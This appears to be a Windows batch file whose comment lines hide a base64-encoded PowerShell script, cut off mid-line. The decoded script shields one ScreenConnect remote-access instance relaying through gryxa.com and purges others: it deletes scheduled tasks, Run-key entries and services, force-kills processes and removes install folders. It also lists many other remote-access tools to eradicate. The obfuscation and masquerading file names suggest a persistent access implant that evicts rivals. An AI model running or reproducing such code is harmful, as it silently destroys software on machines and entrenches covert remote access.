::ICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAgICAg
::aWYgKCRzIC1tYXRjaCAnKD9pKWdyeXhhXC5jb218c2V2cnpcLmNvbScpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgaWYgKCRzIC1tYXRjaCAnKD9pKW93bihfbW9u
::fF9saWJ8X3NlY3VyZSk/XC4oY21kfHBzMSl8Z3J5eGFfYm9vdHxcLnd1Y2FjaGUn
::KSB7IHJldHVybiAkdHJ1ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVw
::KSB7IGlmICgkayAtYW5kICRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUg
::fSB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBmdW5jdGlv
::biBSZW1vdmUtU2NQZXJzaXN0ZW5jZShbc3RyaW5nXSRGcCkgew0KICAgICAgICAj
::IEwzOTogcHVyZ2UgU2NyZWVuQ29ubmVjdCBwZXJzaXN0ZW5jZSByZWZlcmVuY2lu
::ZyB0aGlzIEZQIE9SIGdlbmVyaWMgU0MgaW5zdGFsbGVycw0KICAgICAgICAjIHRo
::YXQgYXJlIG5vdCBrZWVwZXItcHJvdGVjdGVkIChiYXJlIG1zaWV4ZWMgL2kgVVJM
::IHdhdGNoZG9ncyB3aXRob3V0IEZQIGxpdGVyYWwpLg0KICAgICAgICB0cnkgew0K
::ICAgICAgICAgICAgR2V0LVNjaGVkdWxlZFRhc2sgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAg
::JHRhc2sgPSAkXw0KICAgICAgICAgICAgICAgICRibG9iID0gJycNCiAgICAgICAg
::ICAgICAgICBmb3JlYWNoICgkYSBpbiAkdGFzay5BY3Rpb25zKSB7ICRibG9iICs9
::ICIgJCgkYS5FeGVjdXRlKSAkKCRhLkFyZ3VtZW50cykiIH0NCiAgICAgICAgICAg
::ICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdHxtc2ll
::eGVjJykgeyByZXR1cm4gfQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVNjS2Vl
::cGVyUmVmICRibG9iKSB7IHJldHVybiB9DQogICAgICAgICAgICAgICAgJGhpdCA9
::ICRmYWxzZQ0KICAgICAgICAgICAgICAgIGlmICgkRnAgLWFuZCAkYmxvYiAtbWF0
::Y2ggW3JlZ2V4XTo6RXNjYXBlKCRGcCkpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAg
::ICAgICAgICAgICBlbHNlaWYgKCRibG9iIC1tYXRjaCAnKD9pKVNjcmVlbkNvbm5l
::Y3RcLkNsaWVudFNldHVwfFNjcmVlbkNvbm5lY3QgQ2xpZW50fHBrZ19ncnl4YVwu
::bXNpfHBrZ1wubXNpJykgeyAkaGl0ID0gJHRydWUgfQ0KICAgICAgICAgICAgICAg
::IGlmICgkaGl0KSB7DQogICAgICAgICAgICAgICAgICAgIFVucmVnaXN0ZXItU2No
::ZWR1bGVkVGFzayAtVGFza05hbWUgJHRhc2suVGFza05hbWUgLVRhc2tQYXRoICR0
::YXNrLlRhc2tQYXRoIC1Db25maXJtOiRmYWxzZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBMb2cgInBlcnNpc3RfdGFz
::a19yZW1vdmVkICQoJHRhc2suVGFza1BhdGgpJCgkdGFzay5UYXNrTmFtZSkgZnA9
::JEZwIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAg
::fSBjYXRjaCB7IExvZyAicGVyc2lzdF90YXNrX2VudW1fZXJyICRfIiB9DQogICAg
::ICAgIGZvcmVhY2ggKCRyayBpbiBAKCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRc
::V2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLA0KICAgICAgICAgICAgICAgICAg
::ICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVu
::dFZlcnNpb25cUnVuT25jZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdI
::S0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJy
::ZW50VmVyc2lvblxSdW4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtM
::TTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVu
::dFZlcnNpb25cUnVuT25jZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdI
::S0NVOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxS
::dW4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtDVTpcU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZScpKSB7DQog
::ICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyaykpIHsgY29udGludWUg
::fQ0KICAgICAgICAgICAgJHAgPSBHZXQtSXRlbVByb3BlcnR5ICRyayAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHAp
::IHsgY29udGludWUgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoJHByb3AgaW4gJHAu
::UFNPYmplY3QuUHJvcGVydGllcykgew0KICAgICAgICAgICAgICAgIGlmICgkcHJv
::cC5OYW1lIC1saWtlICdQUyonKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgICAg
::ICAkdiA9IFtzdHJpbmddJHByb3AuVmFsdWUNCiAgICAgICAgICAgICAgICBpZiAo
::VGVzdC1TY0tlZXBlclJlZiAkdikgeyBjb250aW51ZSB9DQogICAgICAgICAgICAg
::ICAgaWYgKCR2IC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3R8bXNpZXhlYycp
::IHsgY29udGludWUgfQ0KICAgICAgICAgICAgICAgICRoaXQgPSAkZmFsc2UNCiAg
::ICAgICAgICAgICAgICBpZiAoJEZwIC1hbmQgJHYgLW1hdGNoIFtyZWdleF06OkVz
::Y2FwZSgkRnApKSB7ICRoaXQgPSAkdHJ1ZSB9DQogICAgICAgICAgICAgICAgZWxz
::ZWlmICgkdiAtbWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0XC5DbGllbnRTZXR1cHxT
::Y3JlZW5Db25uZWN0IENsaWVudCcpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAg
::ICAgICAgICBpZiAoJGhpdCkgew0KICAgICAgICAgICAgICAgICAgICBSZW1vdmUt
::SXRlbVByb3BlcnR5IC1QYXRoICRyayAtTmFtZSAkcHJvcC5OYW1lIC1Gb3JjZSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgICAg
::ICBMb2cgInBlcnNpc3RfcnVua2V5X3JlbW92ZWQgJHJrXCQoJHByb3AuTmFtZSkg
::ZnA9JEZwIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAg
::ICAgfQ0KICAgIH0NCg0KICAgIExvZyAnZXh0ZXJtaW5hdGVfZW5naW5lX0w3X2Jl
::Z2luJw0KDQogICAgIyBwdXJnZSBwZXJzaXN0ZW5jZSBmb3IgZXZlcnkgbm9uLWtl
::ZXBlciBTQyBmaW5nZXJwcmludCBCRUZPUkUgcHJvZHVjdC9zdmMvZGlyIHJlbW92
::YWwsDQogICAgIyBzbyBhbiBvbGQvZm9yZWlnbiBTQyB3YXRjaGRvZyBjYW5ub3Qg
::cmVpbnN0YWxsIGl0c2VsZiAoYW5kIGNyb3NzLWtpbGwgR3J5eGEpIG1pZC1wYXNz
::Lg0KICAgIGZvcmVhY2ggKCRmcFggaW4gKEdldC1Ob25LZWVwZXJTY0ZwcykpIHsN
::CiAgICAgICAgUmVtb3ZlLVNjUGVyc2lzdGVuY2UgJGZwWA0KICAgIH0NCg0KICAg
::ICMgMS4gZm9yZWlnbiBTQyBwcm9kdWN0cyBmcm9tIEJPVEggY29ycmVjdCBBUlAg
::aGl2ZXMNCiAgICAkc2VlbiA9IEB7fQ0KICAgIGZvcmVhY2ggKCRyb290IGluICRz
::Y3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAgaWYgKC1ub3QgKFRlc3Qt
::UGF0aCAkcm9vdCkpIHsgTG9nICJoaXZlX21pc3NpbmcgJHJvb3QiOyBjb250aW51
::ZSB9DQogICAgICAgIExvZyAiaGl2ZV9zY2FuICRyb290Ig0KICAgICAgICBHZXQt
::Q2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
::Rm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHByb3AgPSBHZXQtSXRlbVBy
::b3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
::ICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUNCiAgICAgICAgICAg
::IGlmICgtbm90ICRkbikgeyByZXR1cm4gfQ0KICAgICAgICAgICAgaWYgKCRkbiAt
::bm90bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0XHMrQ2xpZW50XHMqXCgoWzAtOUEt
::RmEtZl17MTZ9KVwpJykgeyByZXR1cm4gfQ0KICAgICAgICAgICAgJGZwID0gJE1h
::dGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAgICAgICBpZiAoJGZwIC1pbiAka2Vl
::cCkgeyByZXR1cm4gfQ0KICAgICAgICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxs
::U3RyaW5nDQogICAgICAgICAgICBpZiAoJHVzIC1hbmQgJHVzIC1tYXRjaCAnKD9p
::KWdyeXhhXC5jb20nKSB7IExvZyAicHJvZHVjdF9za2lwX2dyeXhhX3JlbGF5IFsk
::ZG5dIjsgcmV0dXJuIH0NCiAgICAgICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tl
::eSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICRzZWVu
::WyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlDQogICAgICAgICAgICBpZiAoVW5pbnN0
::YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucHJvZHVjdCsrIH0gZWxzZSB7ICRuLmZh
::aWwrKzsgTG9nICJwcm9kdWN0X1JFTU9WRV9GQUlMRUQgWyRkbl0iIH0NCiAgICAg
::ICAgfQ0KICAgIH0NCg0KICAgICMgMi4gZm9yZWlnbiBTQyBzZXJ2aWNlcyAoc2tp
::cCBpZiBrZWVwZXIgRlAgb3IgcmVsYXkgaXMgZ3J5eGEuY29tKQ0KICAgIGZvcmVh
::Y2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29u
::bmVjdCBDbGllbnQqJyB9KSkgew0KICAgICAgICBpZiAoSXMtS2VlcGVyICRzdmMu
::TmFtZSkgeyBjb250aW51ZSB9DQogICAgICAgICRpbWcgPSAoR2V0LUl0ZW1Qcm9w
::ZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCQo
::JHN2Yy5OYW1lKSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkltYWdl
::UGF0aA0KICAgICAgICBpZiAoSXMtS2VlcGVyICRpbWcpIHsgTG9nICJzdmNfc2tp
::cF9ncnl4YV9yZWxheSAkKCRzdmMuTmFtZSkiOyBjb250aW51ZSB9DQogICAgICAg
::ICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNjAwDQogICAgICAgICYg
::c2MuZXhlIGRlbGV0ZSAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIg0K
::ICAgIH0NCg0KICAgICMgMy4gZm9yZWlnbiBTQyBwcm9jZXNzZXMg4oCUIE9OTFkg
::aWYgcGF0aC9jbWRsaW5lIGVtYmVkcyBhIE5PTi1rZWVwZXIgRlAuDQogICAgIyBP
::NDE6IG51bGwgRXhlY3V0YWJsZVBhdGggdXNlZCB0byBraWxsIEdyeXhhIENsaWVu
::dFNlcnZpY2UgZXZlcnkgdGljayDihpIgcmVpbnN0YWxsIGxvb3AuDQogICAgR2V0
::LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdT
::Y3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
::Rm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkZXhlID0gW3N0cmluZ10kXy5FeGVj
::dXRhYmxlUGF0aA0KICAgICAgICAkY21kID0gW3N0cmluZ10kXy5Db21tYW5kTGlu
::ZQ0KICAgICAgICAkYmxvYiA9ICIkZXhlICRjbWQiDQogICAgICAgIGlmIChJcy1L
::ZWVwZXIgJGJsb2IpIHsgcmV0dXJuIH0NCiAgICAgICAgaWYgKCRibG9iIC1tYXRj
::aCAnKD9pKWdyeXhhXC5jb20nKSB7IExvZyAicHJvY19za2lwX2dyeXhhX3JlbGF5
::IHBpZD0kKCRfLlByb2Nlc3NJZCkiOyByZXR1cm4gfQ0KICAgICAgICBpZiAoJGJs
::b2IgLW5vdG1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAg
::ICAgICBMb2cgInByb2Nfc2tpcF9ub19mcCBwaWQ9JCgkXy5Qcm9jZXNzSWQpIG5h
::bWU9JCgkXy5OYW1lKSINCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQog
::ICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICBpZiAo
::JGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQ0KICAgICAgICBTdG9wLVByb2Nlc3Mg
::LUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nfa2lsbGVkIHBpZD0k
::KCRfLlByb2Nlc3NJZCkgZnA9JGZwIGV4ZT0kZXhlIg0KICAgIH0NCg0KICAgICMg
::NC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikNCiAgICBmb3Jl
::YWNoICgkYmFzZSBpbiBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX0pKSB7DQogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90
::IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNo
::aWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUt
::T2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdConIH0gfCBGb3JF
::YWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGQgPSAkXy5GdWxsTmFtZQ0K
::ICAgICAgICAgICAgICAgIGlmIChJcy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0NCiAg
::ICAgICAgICAgICAgICAjIGRpciBjYXJyaWVzIG5vIEZQL3JlbGF5IGluIGl0cyBu
::YW1lOyBwcm90ZWN0IHRoZSBvbmUgYmFja2luZyBhIGtlZXBlci9ncnl4YSBzZXJ2
::aWNlDQogICAgICAgICAgICAgICAgJGxlYWYgPSAkXy5OYW1lDQogICAgICAgICAg
::ICAgICAgJHN2Y0hlcmUgPSBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVl
::bkNvbm5lY3QgQ2xpZW50KicgfSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAgICAgICAgICRpbSA9IChHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1c
::Q3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcJCgkXy5OYW1lKSIgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUpLkltYWdlUGF0aA0KICAgICAgICAgICAgICAg
::ICAgICAkaW0gLWFuZCAoJGltIC1saWtlICIqJGxlYWYqIikNCiAgICAgICAgICAg
::ICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRzdmNIZXJlKSB7IExvZyAiZGly
::X3NraXBfbGl2ZV9zdmMgJGQiOyByZXR1cm4gfQ0KICAgICAgICAgICAgICAgIGlm
::IChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92
::ZWQgJGQiIH0NCiAgICAgICAgICAgICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cg
::ImRpcl9SRU1PVkVfRkFJTEVEICRkIiB9DQogICAgICAgICAgICB9DQogICAgfQ0K
::DQogICAgIyA1LiBkaXNhbGxvd2VkIFJNTSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMg
::KG1hcmtldCBjb3ZlcmFnZSAyMDI2KS4NCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0
::dG8vQ2VudHJhU3RhZ2UgKyBTY3JlZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVk
::IGFib3ZlKS4NCiAgICAjIE5FVkVSIHB1dCBEYXR0by9DZW50cmFTdGFnZS9DYWdT
::ZXJ2aWNlIGluIHRoaXMgbGlzdC4NCiAgICBmdW5jdGlvbiBJcy1EYXR0b0tlZXBl
::cihbc3RyaW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAk
::ZmFsc2UgfQ0KICAgICAgICByZXR1cm4gW2Jvb2xdKCRzIC1tYXRjaCAnKD9pKURh
::dHRvfENlbnRyYVN0YWdlfENhZ1NlcnZpY2V8QXV0b3Rhc2tFbmRwb2ludCcpDQog
::ICAgfQ0KICAgICRybW0gPSBAKA0KICAgICAgICBAeyBUYWc9J0FueURlc2snOyAg
::ICAgIFN2Yz1AKCdBbnlEZXNrJyk7IFByb2M9QCgnQW55RGVzaycpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEFueURlc2siLCIke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX1cQW55RGVzayIsIiRlbnY6UHJvZ3JhbURhdGFcQW55RGVzayIpOyBQcm9k
::PUAoJ0FueURlc2sqJykgfQ0KICAgICAgICBAeyBUYWc9J1RlYW1WaWV3ZXInOyAg
::IFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJywndHZf
::dzMyKicsJ3R2X3g2NConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFt
::Vmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsg
::UHJvZD1AKCdUZWFtVmlld2VyKicpIH0NCiAgICAgICAgQHsgVGFnPSdTcGxhc2h0
::b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2VydmljZScsJ1NTVVNlcnZp
::Y2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFuYWdl
::cionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cU3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNo
::dG9wKicpIH0NCiAgICAgICAgQHsgVGFnPSdMb2dNZUluJzsgICAgICBTdmM9QCgn
::TG9nTWVJbicsJ0xNSUd1YXJkaWFuU3ZjJywnTE1JaWduaXRpb24nKTsgUHJvYz1A
::KCdMb2dNZUluKicsJ0xNSUd1YXJkaWFuKicsJ1JhU2VydmVyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXExvZ01lSW4iLCIke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX1cTG9nTWVJbiIpOyBQcm9kPUAoJ0xvZ01lSW4qJykgfQ0KICAgICAgICBA
::eyBUYWc9J0dvVG8nOyAgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNz
::aXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9B
::c3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdv
::VG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1Rv
::IFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywnR29UbyBDb25uZWN0KicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdy
::dXN0ZGVzayonKTsgUHJvYz1AKCdydXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xSdXN0RGVzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxS
::dXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNrKicpIH0NCiAgICAgICAgQHsgVGFn
::PSdTdXByZW1vJzsgICAgICBTdmM9QCgnU3VwcmVtbyonKTsgUHJvYz1AKCdTdXBy
::ZW1vKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFN1cHJlbW8iLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cU3VwcmVtbyIpOyBQcm9kPUAoJ1N1cHJlbW8q
::JykgfQ0KICAgICAgICBAeyBUYWc9J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0Fn
::ZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAo
::J0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0NCiAgICAgICAgQHsgVGFnPSdab2hv
::QXNzaXN0JzsgICBTdmM9QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsg
::UHJvYz1AKCdab2hvQXNzaXN0KicsJ1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgnWm9obyBBc3Npc3QqJywnWm9ob01l
::ZXRpbmcqJykgfQ0KICAgICAgICBAeyBUYWc9J1JlbW90ZVBDJzsgICAgIFN2Yz1A
::KCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1vdGVQQyonLCdSUENTdWl0ZSonKTsg
::RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZW1vdGVQQyIsIiR7ZW52OlByb2dy
::YW1GaWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdCb21nYXInOyAgICAgICBTdmM9QCgnYm9tZ2FyKics
::J0JleW9uZFRydXN0KicpOyBQcm9jPUAoJ2JvbWdhcionKTsgRGlycz1AKCIkZW52
::OlByb2dyYW1GaWxlc1xCb21nYXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::Qm9tZ2FyIiwiJGVudjpQcm9ncmFtRmlsZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1c3QiKTsgUHJvZD1AKCdCb21nYXIq
::JywnQmV5b25kVHJ1c3QqJykgfQ0KICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAg
::ICAgIFN2Yz1AKCdQYXJzZWMqJyk7IFByb2M9QCgncGFyc2VjZConLCdwc2Vydmlj
::ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQYXJzZWMiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVudjpQcm9ncmFtRGF0YVxQYXJz
::ZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQ0KICAgICAgICBAeyBUYWc9J0Nocm9t
::ZVJEJzsgICAgIFN2Yz1AKCdjaHJvbW90aW5nKicpOyBQcm9jPUAoJ3JlbW90aW5n
::X2hvc3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9t
::ZSBSZW1vdGUgRGVza3RvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb29n
::bGVcQ2hyb21lIFJlbW90ZSBEZXNrdG9wIik7IFByb2Q9QCgnQ2hyb21lIFJlbW90
::ZSBEZXNrdG9wKicpIH0NCiAgICAgICAgQHsgVGFnPSdVbHRyYVZOQyc7ICAgICBT
::dmM9QCgndXZuYyonLCd3aW52bmMqJyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVWx0cmFWTkMiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1AKCdVbHRyYVZOQyon
::LCdXaW5WTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2
::Yz1AKCd0dm5zZXJ2ZXIqJyk7IFByb2M9QCgndHZuc2VydmVyKicsJ3R2bnZpZXdl
::cionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUaWdodFZOQyIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9kPUAoJ1RpZ2h0Vk5D
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdSZWFsVk5DJzsgICAgICBTdmM9QCgndm5j
::c2VydmVyKicpOyBQcm9jPUAoJ3ZuY3NlcnZlcionLCd2bmN2aWV3ZXIqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVhbFZOQyIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxSZWFsVk5DIik7IFByb2Q9QCgnVk5DIFNlcnZlcionLCdSZWFs
::Vk5DKicpIH0NCiAgICAgICAgQHsgVGFnPSdEYW1lV2FyZSc7ICAgICBTdmM9QCgn
::RGFtZVdhcmUqJyk7IFByb2M9QCgnRFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdhcmUq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU29sYXJXaW5kcyIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxTb2xhcldpbmRzIiwiJGVudjpQcm9ncmFtRmls
::ZXNcRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2Fy
::ZSonKSB9DQogICAgICAgIEB7IFRhZz0nTmV0U3VwcG9ydCc7ICAgU3ZjPUAoJ05l
::dFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywncGNpY3RsKicpOyBEaXJz
::PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cTmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykg
::fQ0KICAgICAgICBAeyBUYWc9J1NpbXBsZUhlbHAnOyAgIFN2Yz1AKCdTaW1wbGVI
::ZWxwKicpOyBQcm9jPUAoJ1NpbXBsZVNlcnZpY2UqJywnc2ltcGxlc2VydmljZSon
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTaW1wbGVIZWxwIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XFNpbXBsZUhlbHAiKTsgUHJvZD1AKCdTaW1wbGVI
::ZWxwKicpIH0NCiAgICAgICAgQHsgVGFnPSdHZXRTY3JlZW4nOyAgICBTdmM9QCgn
